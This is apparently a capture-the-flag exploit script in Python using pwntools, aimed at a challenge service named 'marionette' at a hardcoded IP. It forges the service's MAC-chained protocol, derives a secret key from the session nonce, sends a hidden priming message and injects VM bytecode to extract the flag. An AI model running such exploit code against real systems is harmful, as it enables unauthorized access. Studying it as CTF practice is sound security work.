#!/usr/bin/env python3
import argparse
import re
import struct

from pwn import *

context.log_level = "debug"

MASK = (1 << 64) - 1
C1 = 0xFF51AFD7ED558CCD
C2 = 0xC4CEB9FE1A85EC53
FNV_PRIME = 0x100000001B3
FNV_BASIS = 0xCBF29CE484223325

A020 = 0xE3A7D1B5924F6C80
A028 = 0x9FED4FA8A9104CE8
A048 = 0x4F72C3A8B1D5E6F0
A058 = 0xECED98D69CC9A698
A068 = 0x3C51A7D2E8F61B93

SEED_XOR = A020 ^ A028
STATIC_G = A048 ^ A058 ^ A068


def fmix(x):
    x &= MASK
    x ^= x >> 33
    x = (x * C1) & MASK
    x ^= x >> 33
    x = (x * C2) & MASK
    x ^= x >> 33
    return x & MASK


def xorshift(x):
    x &= MASK
    x ^= (x << 13) & MASK
    x ^= x >> 7
    x ^= (x << 17) & MASK
    return x & MASK


def fnv1a(data, h=FNV_BASIS):
    for b in data:
        h = ((h ^ b) * FNV_PRIME) & MASK
    return h


def push(x):
    return b"\x01" + p64(x & MASK)


def newbuf(size):
    return b"\x41" + p64(size & MASK)


def vm_seed_after_init(nonce):
    state = nonce ^ SEED_XOR
    rand_count = (fmix(nonce) % 7) + 3
    rand_count += (fmix(nonce ^ 0xBEEF) & 3) + 2
    for _ in range(rand_count):
        state = xorshift(state)
    return state


class PuppetClient:
    """Framed, FNV1a-MAC-chained protocol riding on a pwntools tube."""

    MARKERS = (b"#OK\n", b"#ERR", b"!!")

    def __init__(self, tube):
        self.tube = tube
        self.seq = 1
        self.state = FNV_BASIS
        self.prev = 0

    def recv_until_marker(self, timeout=2):
        try:
            return self.tube.recvuntil(self.MARKERS, timeout=timeout)
        except EOFError:
            return self.tube.recvrepeat(0.2)

    def send(self, typ, payload=b""):
        mac = self.state
        mac = fnv1a(struct.pack("<I", self.seq), mac)
        mac = fnv1a(struct.pack("<Q", self.prev), mac)
        mac = fnv1a(payload, mac)
        header = struct.pack(">BIQH", typ, self.seq, mac, len(payload))
        self.tube.send(header + payload)
        self.seq += 1
        self.state = mac
        self.prev = mac
        return self.recv_until_marker()


def read_nonce(tube):
    banner = tube.recvuntil(b"#OK\n", timeout=5)
    m = re.search(rb"SESSION NONCE ([0-9a-fA-F]+)", banner)
    if not m:
        raise RuntimeError(f"no SESSION NONCE in banner: {banner!r}")
    return int(m.group(1), 16)


def build_payload(stage_count, key):
    code = b""
    code += newbuf(512)
    code += b"\x03"
    code += push(12) + b"\x10"
    code += push(8 * (stage_count + 1)) + b"\x11"
    code += push(-2) + b"\x04" + push(1) + b"\x60"
    code += newbuf(1) + b"\x02"
    code += b"\x03" + push(key) + b"\x66"
    code += b"\x51\x35"
    return struct.pack(">H", len(code)) + code


def exploit(tube, prefix):
    nonce = read_nonce(tube)
    log.info("session nonce: %#018x", nonce)
    client = PuppetClient(tube)

    pool = client.send(2).decode("latin1", "replace")
    stage_count = int(re.search(r"stage (\d+)/(\d+)", pool).group(1))
    log.info("stage count: %d", stage_count)

    seed = vm_seed_after_init(nonce)
    token = fmix(fmix(seed) ^ STATIC_G)
    prime_payload = p64(token)
    prime_hash = fnv1a(prime_payload, FNV_BASIS)
    v48 = fmix(seed ^ prime_hash)

    prefix_qword = int.from_bytes(prefix.encode().ljust(8, b"\0")[:8], "little")
    key = seed ^ v48 ^ STATIC_G ^ prefix_qword

    prime = client.send(0x50, prime_payload)
    if b"#OK" not in prime:
        raise RuntimeError(f"hidden prime failed: {prime!r}")
    log.success("hidden 0x50 prime accepted")

    return client.send(1, build_payload(stage_count, key))


def make_tube(args):
    """Return (tube, server) where server is the local process or None."""
    if not args.local:
        return remote(args.host, args.port), None

    port = 23946
    env = {"PUPPET_PORT": str(port), "PUPPET_TIMEOUT": "10"}
    server = process(args.binary, env=env)
    for _ in range(100):               # wait for the listener to come up
        try:
            probe = remote("127.0.0.1", port, timeout=0.2)
            probe.close()
            break
        except PwnlibException:
            time.sleep(0.03)
    return remote("127.0.0.1", port), server


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?", default="113.20.103.216")
    ap.add_argument("port", nargs="?", default=9999, type=int)
    ap.add_argument("--prefix", default="CSCV2026")
    ap.add_argument("--binary", default="./marionette")
    ap.add_argument("--local", action="store_true")
    args = ap.parse_args()

    tube, server = make_tube(args)
    try:
        result = exploit(tube, args.prefix)
        out = result.decode("latin1", "replace")
        print(out, end="" if out.endswith("\n") else "\n")
        m = re.search(r"[A-Za-z0-9_]+\{[^}]*\}", out)
        if m:
            log.success("FLAG: %s", m.group(0))
    finally:
        tube.close()
        if server:
            server.close()


if __name__ == "__main__":
    main()
